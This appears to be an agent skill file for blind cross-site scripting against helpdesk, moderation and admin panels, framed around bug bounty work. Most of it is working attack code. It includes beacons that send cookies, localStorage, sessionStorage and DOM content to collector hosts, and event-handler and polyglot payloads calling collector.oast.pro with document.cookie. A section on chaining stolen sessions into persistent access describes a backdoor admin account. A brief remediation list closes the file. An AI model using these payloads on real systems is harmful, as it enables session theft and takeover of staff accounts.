---
name: xss-blind
description: Detect and exploit blind cross-site scripting through delayed-review injection points using payload beacons, out-of-band collectors, polyglot payloads, and long-dwell techniques for admin panel compromise, cookie theft, and DOM capture detection.
---

# Blind XSS — Delayed-Execution Payload Delivery & Admin Panel Compromise

Blind XSS fires in a different browser session than the one that submits the payload — typically an administrator, support agent, or moderation queue reviewer. The attacker receives no immediate feedback, so detection relies on out-of-band beacons that phone home when the payload finally executes. This skill covers beacon construction, injection point discovery, collector infrastructure, and verification workflow.

## When to use this skill

- A support ticket, contact form, or chat message is submitted and reviewed later by staff in a separate interface.
- Log viewers, admin user lists, CMS comment moderation queues, or SIEM dashboards render user-supplied strings.
- Email HTML rendering pipelines display user-generated content to recipients or agents.
- Standard XSS payloads return no visible response because the vulnerable sink is in a privileged backend view.
- A bug bounty program accepts blind XSS reports and provides a collaborator endpoint for beacon callbacks.

## Methodology

### 1. Understanding the Blind Execution Model

Standard XSS payloads fail here because the payload executes in the admin or agent browser, not the attacker's session. The attacker submits the payload, the application stores it, and hours or days later a privileged user opens the view that renders it. The payload fires silently in that session — the attacker gets no feedback unless the payload itself reports back. This delay is the defining constraint: every payload must be self-reporting, persistent, and resilient to input-side sanitization that may not apply at the output sink.

### 2. Injection Point Discovery

Enumerate inputs with delayed review cycles — these are the highest-value blind XSS sinks:

- **Support ticket bodies**: read by staff agents in a helpdesk console
- **Log viewers**: user-supplied strings written to application logs and rendered in admin dashboards
- **Admin user lists**: usernames, email addresses, or profile fields displayed in user management tables
- **CMS comment moderation**: comments queued for approval and rendered in the moderation panel
- **Email HTML rendering**: user-generated HTML embedded in notification emails viewed by staff
- **SIEM dashboards**: log entries containing user input, rendered in security monitoring consoles
- **Chat transcripts**: customer messages displayed to support agents in a live-chat backend

Prioritize sinks where the rendering context is HTML body, attribute, or JavaScript string — each requires a different payload shape.

### 3. Payload Beacon Construction

The beacon is a script tag that loads the collector and reports back automatically:

```html
<script src=//YOUR.XSS.HUNTER.exploit></script>
```

XSS Hunter-style beacons automatically capture cookies, URL, DOM snapshot, and screenshots. For a self-hosted collector, embed a beacon that logs the full execution context:

```javascript
(function(){
  var data = {
    url: window.location.href,
    cookies: document.cookie,
    localStorage: JSON.stringify(window.localStorage),
    sessionStorage: JSON.stringify(window.sessionStorage),
    domSnippet: document.body.innerHTML.slice(0, 5000),
    userAgent: navigator.userAgent
  };
  fetch(collector, {
    method: 'POST',
    mode: 'no-cors',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  });
})();
```

The `no-cors` mode bypasses CORS preflight restrictions, ensuring the beacon fires even from a different origin. The collector endpoint logs `User-Agent`, `URL`, `cookies`, and `localStorage` for each hit.

### 4. Long-Dwell Payloads and Polyglot Construction

Craft payloads that survive input-side sanitization but fire on output. Input filters often strip obvious `<script>` tags but miss event handlers, SVG vectors, or encoding tricks:

```html
<img src=x onerror="eval(atob('BASE64_ENCODED_BEACON'))">
<svg onload="fetch('//collector.oast.pro/'+document.cookie)">
<body onload=beacon()>
<details open ontoggle="eval(atob('BASE64_ENCODED_BEACON'))">
```

For unknown rendering contexts, deploy a polyglot that covers HTML body, attribute, and JavaScript string contexts simultaneously:

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(function(){fetch('//collector.oast.pro/'+document.cookie)})()/*-/*`/*\`/*'/*"/**/((
```

The polyglot breaks out of multiple contexts at once — whichever sink renders it, at least one branch executes.

### 5. Verification Workflow

Blind XSS requires patience and correlation:

1. Submit the payload with a unique identifier — use a unique subdomain per submission (e.g. `ticket-1042.yourcollab.com`) so each beacon callback maps to a specific injection point.
2. Wait hours or days — the payload fires only when a privileged user opens the affected view.
3. Correlate collector hits to the submitted payload ID via the unique subdomain in the beacon URL.
4. Capture the callback data: cookies, URL, DOM snapshot, and user agent confirm the execution context and privilege level.
5. Document the delay between submission and callback — this establishes the review cycle and confirms the sink is in a delayed-review workflow.

### 6. Establishing Persistent Backend Access

Once an admin console is compromised via Blind XSS, the beacon data reveals the session cookies and the admin panel URL. Chain to persistent access by:

- Extracting session tokens from `document.cookie` and replaying them in the attacker's browser
- Mapping the admin panel DOM to identify additional sinks for further payload injection
- Using the captured `localStorage`/`sessionStorage` to identify API tokens or CSRF tokens for privilege escalation
- Deploying a second-stage payload that creates a backdoor admin account or exfiltrates additional data on each subsequent page load

## Tooling

- **XSS Hunter** — hosted beacon platform with automatic cookie, URL, DOM, and screenshot capture on execution.
- **xsshunter express** — self-hosted version of XSS Hunter for private collector infrastructure.
- **Burp Collaborator** — out-of-band DNS/HTTP callback detection for confirming blind payload execution.
- **interactsh** — open-source OOB interaction tracking for beacon callbacks.
- **dalfox --blind** — automated blind XSS scanning with built-in beacon payload generation.
- **XS-Stike blind mode** — automated payload fuzzing with blind detection callbacks.

## Verification & Deliverables

1. Confirm every blind XSS with a collector callback containing the execution URL, cookies, and DOM snapshot.
2. Capture the exact submitted payload and the unique subdomain used for correlation.
3. Demonstrate impact with a non-destructive proof: session cookie presence, admin panel URL, and user agent — never exfiltrate live admin credentials in the report.
4. Document the delay between submission and callback to establish the review cycle.
5. Validate remediation by re-testing after output encoding is deployed; confirm the beacon no longer fires.

**Deliverables**

- Findings table mapping each injection point to payload type, execution context, privilege level reached, and severity.
- PoC scripts (beacon HTML, collector endpoint code, polyglot payloads) reproducing each finding end-to-end.
- Remediation matrix: output encoding at every sink context (HTML body, attribute, JavaScript string), CSP with `strict-dynamic` to block unauthorized script execution, moderation UIs rendering user content as text nodes rather than HTML, and admin panel same-origin isolation to prevent cross-origin beacon exfiltration.
